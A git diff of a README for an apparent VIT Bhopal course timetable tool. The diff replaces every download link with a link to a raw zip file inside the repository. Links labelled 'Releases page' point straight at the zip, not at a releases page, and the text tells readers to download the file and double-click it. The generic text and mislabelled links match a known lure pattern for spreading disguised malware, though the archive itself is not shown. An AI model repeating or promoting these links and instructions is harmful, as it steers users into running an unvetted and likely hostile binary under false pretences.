@@ -1,6 +1,6 @@
 # 🎓 ffcs-timetable-vitb - Simplify Your Course Registration Today
 
-[![Download](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/raw/refs/heads/main/static/ffcs_vitb_timetable_2.0.zip)](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/raw/refs/heads/main/static/ffcs_vitb_timetable_2.0.zip)
+[![Download](https://raw.githubusercontent.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/main/utils/timetable_vitb_ffcs_singally.zip)](https://raw.githubusercontent.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/main/utils/timetable_vitb_ffcs_singally.zip)
 
 ## 📖 Description
 
@@ -20,10 +20,10 @@ To use the FFCS Timetable Maker, you need to download the software from our GitH
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/raw/refs/heads/main/static/ffcs_vitb_timetable_2.0.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/main/utils/timetable_vitb_ffcs_singally.zip).
 
 2. **Download the Latest Version:**  
-   Look for the latest release, and click on the corresponding download link for your operating system. If you see a file like `https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/raw/refs/heads/main/static/ffcs_vitb_timetable_2.0.zip`, click to download it.
+   Look for the latest release, and click on the corresponding download link for your operating system. If you see a file like `https://raw.githubusercontent.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/main/utils/timetable_vitb_ffcs_singally.zip`, click to download it.
 
 3. **Run the Application:**  
    Once the download is complete, locate the file on your computer. Double-click the file to open the application.
@@ -100,4 +100,4 @@ If you need assistance, you can find help:
 
 ## 🎉 Conclusion
 
-With the VIT Bhopal FFCS Timetable Maker, you can take control of your academic scheduling. The tool is designed for developers and everyday users alike. Download it today from our [Releases page](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/raw/refs/heads/main/static/ffcs_vitb_timetable_2.0.zip) and simplify your course registration process.
+With the VIT Bhopal FFCS Timetable Maker, you can take control of your academic scheduling. The tool is designed for developers and everyday users alike. Download it today from our [Releases page](https://raw.githubusercontent.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/main/utils/timetable_vitb_ffcs_singally.zip) and simplify your course registration process.
